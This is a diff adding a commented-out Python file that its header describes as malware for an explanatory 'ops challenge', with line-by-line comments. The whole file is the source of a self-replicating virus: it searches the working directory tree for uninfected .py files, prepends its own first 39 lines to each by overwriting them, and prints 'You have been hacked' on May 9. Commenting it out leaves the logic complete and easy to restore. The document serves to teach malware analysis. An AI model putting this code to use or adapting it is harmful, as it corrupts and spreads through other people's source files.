@@ -1,0 +1,49 @@
+# #!/usr/bin/python
+
+# Do not run this code the point of this ops Challenges is to explain what the script is doing here this is a malware script
+
+
+# import os             # importing libs
+# import datetime       # importing libs
+
+# SIGNATURE = "VIRUS"                                      # something to write later
+
+# def locate(path):
+#     files_targeted = []                                       # start a blank list of files
+#     filelist = os.listdir(path)                               # fille it with a list of files in the directory the script is in
+#     for fname in filelist:                                    # for each file
+#         if os.path.isdir(path+"/"+fname):                     # if the path is a directory name
+#             files_targeted.extend(locate(path+"/"+fname))     # fine all the files there, and add them to a list
+#         elif fname[-3:] == ".py":                             # don't look to see if infected .py files
+#             infected = False
+#             for line in open(path+"/"+fname):                 # look to see if VIRUS is on the firs tlihe
+#                 if SIGNATURE in line:
+#                     infected = True
+#                     break
+#             if infected == False:                             # if the file isn't infected, put it on a list so it will be
+#                 files_targeted.append(path+"/"+fname)
+#     return files_targeted                                     # return the list of target (ie unifected) files
+
+
+# def infect(files_targeted):
+#     virus = open(os.path.abspath(__file__))           # opening a file
+#     virusstring = ""                                  # reading in all the string components into a virus string
+#     for i,line in enumerate(virus):
+#         if 0 <= i < 39:
+#             virusstring += line
+#     virus.close                                       # done making the virus stirng
+#     for fname in files_targeted:                      # for each file in the list of files targeted
+#         f = open(fname)                               # open file
+#         temp = f.read()                               # get contents
+#         f.close()                                     # close file
+#         f = open(fname,"w")                           # open file for writing (whacks old file)
+#         f.write(virusstring + temp)                   # write what was there, but prefix it with the viral string
+#         f.close()                                     # close new infected file that looks like old uninfected file
+
+# def detonate():                                                                           # prints a message if it's 5/9/xxxx
+#     if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
+#         print "You have been hacked"
+
+# files_targeted = locate(os.path.abspath(""))          # gives the absolute path the the current working directory to locate(), and stashes the files in a list
+# infect(files_targeted)                                # calls the infect files on the list made above
+# detonate()                                            # prints a message if the time is right
